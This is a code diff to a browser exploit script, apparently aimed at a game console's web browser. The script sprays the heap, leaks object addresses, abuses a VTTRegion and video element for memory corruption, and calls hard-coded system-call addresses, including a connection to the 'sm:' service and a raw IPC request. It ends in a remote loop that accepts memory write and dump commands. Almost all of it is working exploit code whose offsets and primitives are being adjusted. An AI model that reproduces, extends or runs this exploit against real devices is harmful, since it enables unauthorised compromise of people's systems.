@@ -47,7 +47,7 @@ function debug (msg) {
 //global to use this after
 var sprayCount = 0x30000;
 var ar = new Array(sprayCount);
-var vrs = new Array(10);
+var vrs = new Array(1);
 var vict = null;
 function leakAddrs (obja, objb, objc, cb)
 {
@@ -831,14 +831,19 @@ getTLS = function() {
 
 function svcExitProcess()
 {
-  return call(0x3BBE50, []);
+  return call(0x3BBE60, []);
 }
 
-function svcConnectToNamedPort()
+function svcExitThread()
+{
+  return call(0x3BBE88, []);
+}
+
+function svcConnectToNamedPort(uPortName)
 {
     var pPortName = malloc(0x10);
     var hService = [0xFFFFFFFF, 0xFFFFFFFF];
-    write4(0x003A6D73, pPortName); //sm:
+    write4(uPortName, pPortName);
     var pHandle = malloc(0x10);
     var bResult = call(0x3BBF70, [pHandle, pPortName]);
     if(eq(bResult, [0,0])){
@@ -870,8 +875,10 @@ function loadRun (obj)
     log("funcaddr: "+ convert8(funcaddr));    
     
     mainaddr = walkList();
+    log("mainaddr: "+convert8(mainaddr));
     
-    getSP();
+    sp = getSP();
+    log("sp: "+convert8(sp));
     
     var objM = new VTTRegion();
     var v = document.createElement("video");
@@ -885,9 +892,22 @@ function loadRun (obj)
     //vict = null;
     log("vict: " + convert8(getAddr(vict)));
     
-    hService = svcConnectToNamedPort();
+
+    hService = svcConnectToNamedPort(0x003a6d73); //sm:
     
-    //log(svcSendSyncRequestWithUserBuffer(hService, malloc(0x1000), 0x1000));
+    
+    //Example of call
+    pBuffer = malloc(0x1000);
+    
+    write4(0x00000004, add2(pBuffer, 0x00));
+    write4(0x8000000A, add2(pBuffer, 0x04));
+    write4(0x00000001, add2(pBuffer, 0x08));
+    write4(0x49434653, add2(pBuffer, 0x20));
+        
+    log(svcSendSyncRequestWithUserBuffer(hService, pBuffer, 0x1000));
+        
+    free(pBuffer);
+    
         
     while(true)
     {
@@ -914,7 +934,7 @@ function loadRun (obj)
                 write8(value, addr);
                 log("write8: OK!")
             }
-        }else if(cmd == "dump"){
+        }else if(cmd == "dump8"){
             if(check8(args[1]) == false || args[2] == undefined){
                 send("dump: invalid parameters");
             }else{
